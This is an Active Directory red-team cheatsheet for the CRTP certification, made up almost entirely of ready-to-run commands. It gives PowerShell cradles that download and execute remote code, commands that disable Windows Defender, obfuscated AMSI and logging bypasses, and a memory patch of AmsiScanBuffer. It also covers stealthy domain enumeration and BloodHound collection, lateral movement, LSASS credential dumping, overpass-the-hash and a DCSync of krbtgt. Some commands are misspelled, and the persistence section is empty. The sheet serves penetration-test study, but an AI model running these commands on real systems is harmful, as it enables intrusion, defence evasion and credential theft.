# CRTP Cheatsheet

# Misc But Important
### Powershell Download and Execute Cradles
```
iex (New-Object Net.WebClient).DownloadString('http://ip/file')
```
```
iex (iwr 'http://ip/file')
```
### Bypassing/Disabling Windows Defender
```
Set-MpPreference -DisableRealTimeMonitoring $true
```
```
Set-MpPreference -DisableIOAVProtection $true
```
## ScriptBlock Logging Bypassing 
```
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```
## AMSI Bypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
## Dot Net AMSI Bypass for BloodHound
```
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)

```
## Port Forwarding
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=machineip
```
## AppLocker Policies Enumeration
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
# Domain Enumeration

#### PowerView Script 
https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
```
Import-Module .\PowerView.ps1
```
#### Current and Other Domain Enumeration
```
Get-Domain
Get-Domain -Domain domain_name
```
#### SID of the Current Domain
```
Get-DomainSID
```
#### Domain Controller 
```
Get-DomainController
Get-DomainController -Domain domain_name
```
## Domain User Enumeration
#### List of Users in Current Domain
```
Get-DomainUser
Get-DomainUser -Identity user_name
```
#### Properties of Users in the current domain
```
Get-DomainUser -Identity user_name -Properties*
Get-DomainUser -Properties samaccountname
```
#### Searching for a particular string in a user's attribute
```
Get-DomainUser -LDAPFilter "Description=*built*" | select name, Description
```
#### Enumerating Computers in the current domain
```
Get-DomainComputer
Get-DomainComputer | select name
Get-DomainComputer -Operating System "*Server 2022*"
```
## Domain Group Enumeration
#### Groups in the current and other domains
```
Get-DomainGroup
Get-DomainGroup | select name
Get-DomainGroup -Domain domain_name
```
#### Groups containing the word in a group name
```
Get-DomainGroup *admin*
```
#### All members of the Domain Admin group
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
#### Enumerating Group Membership of a user
```
Get-DomainGroup -UserName "user_name"
```
#### Listing All local groups on a machine
```
Get-NetLocalGroup
Get-NetLocalGroup -ComputerName computer_name
```
#### Members of Local Group "Administrators" on a machine
```
Get-NetLocalGroupMember
Get-NetLocalGroupMember -ComputerName computer_name -GroupName Administrators
```
#### Actively logged user on a computer
```
Get-NetLoggedon
Get-NetLoggedon -ComputerName computer_name 
```
#### Locally Logged Users on a computer
```
Get-LoggedonLocal
Get-LoggedonLocal -ComputerName computer_name
```
#### Last Logged User on a computer
```
Get-LastLoggedOn
Get-LastLoggedOn -ComputerName computer_name
```
### Enumerating Sensitive Shares and Files
#### Shares of Host in a current domain
```
Invoke-ShareFinder -Verbose
```
#### Sensitive Files on computers in the domain
```
Invoke-FileFinder -Verbose
```
#### Getting all fileservers of the domain
```
Get-NetFileServer
```
### GPO Enumeration
#### GPO in the current domain
```
Get-DomainGPO
Get-DomainGPO -ComputerIdentity computer_name
```
 #### Restricted Groups
 ```
Get-DomainGPOLocalGroup
```
#### Users which are in a local group of a machine using GPO
```
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity comp_name
```
#### Machines where the given user is a member of specific group 
```
Get-DomainGPOUserLocalGroupMapping -Identity user_name -Verbose
```
### OU Enumeration
#### OUs in a Domain
```
Get-DomainOU
```
#### GPO Applied on an OU 
```
Get-NetOU
Get-DomainDomainGPO -Identity "GPOName"
```
### ACL Enumeration
#### ACLs associated with specified object
```
Get-DomainObjectAcl -samaccountname name -ResolveGUIDs
```
#### ACLs associated with the specified prefix to be used for search 
```
Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins, CN=Users, DC=dcname -ResolveGUIDs -Verbose
```
#### Searching for Interesting ACEs
```
FindInterestingDomainACL -ResolveGUIDs
```
#### ACLs associated with the specified path 
```
Get-PathAcl -Path "\\dc.domain\sysvol"
```
### Trust Enumeration
#### All Domain Trust for the current and other domains
```
Get-DomainTrust
Get-DomainTrust -Domain domain_name
```
#### Forest Mapping
```
Get-Forest
Get-Forest -Forest forest_name
```
#### Domains in the current forest
```
Get-ForestDomain
Get-ForestDomain -Forest forest_name
```
#### Global Catalog for the current forest
```
Get-ForestGlobalCatalog -Forest forest_name
```
### User Hunting
#### Machine on the current domain where the user has local admin access
```
Find-LocalAdminAccess -Verbose
```
#### Computers where a DA (or specified user/group) has sessions
```
Find-DomainUserLocation
Find-DomainUserLocation -UserGroupIdentity "Group_name"
```
#### Computers where a DA session is available and current user has admin access
```
Find-DomainUserLocation -CheckAccess
```
#### Computers (File Servers and Distributed FS) where a DA session is available
```
Find-DomainUserLocation -Stealth
```
#### List Sessions on Remote Machine
```
Invoke-SessionHunter -FailSafe
```
#### List Sessions on Remote Machine (OPSEC Friendly)
```
Invoke-SessionHunter -NoPortScan -Targets Target_file_path
```
### BloodHound 
```
SharpHound.ps1
```
```
Invoke-BloodHound -CollectionMethod All
```
```
SharpHound.exe
```
#### BloodHound Stealther Usage 
```
Invoke-BloodHound -Stealth
```
```
SharpHound.exe --stealth
```
#### Avoiding MDI 
```
Invoke-BloodHound -ExcludeDCs
```

# Privilege Escalation
#### Unquoted Service Path 
```
Invoke-AllChecks
```
```
Invoke-ServiceAbuse -Name 'ServiceName' -UserName 'name'
```

# Lateral Movement 
### PS-Remoting
```
$sess = New-Session -ComputerName name
Enter-PSSession $sess
```
### A Small Check
```
Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName name
```
#### Execute Commands or ScriptBlock 
```
Inovke-Command -ScriptBlock {Command} -ComputerName name
```
#### Executing Locally Loaded Function
```
Invoke-Command -ScriptBlock ${function:functiontobeexecuted} -ComputerName name
```
#### Disabling Windows Defender Remotely
```
Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealTimeMonitoring $true} -ComputerName name
```
```
Invoke-Command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -ComputerName name
```
### Winrs
```
winrs -r:computername cmd
```
```
winrs -r:computername cmd /c "set username && set computername"
```
### Extracting Hashes from LSASS
#### Invoke-Mimikatz
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys:'
```
#### SafetyKatz 
```
SafetyKatz.exe "sekurlsa::ekeys"
```
### Over Pass The Hash (OPTH)
#### Rubeus 
```
Rubeus.exe -args %Pwn% /user:username /aes256:hash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
#### SafetyKatz
```
SafetKatz.exe "sekurlsa::opassth /user: /aes256: /domain: /run:cmd.exe" "exit"
```
### DCSync
#### Invoke-MimiKatz 
```
Invoke-MimiKatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```
#### SafetyKatz
```
SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt"
```

# Persistence





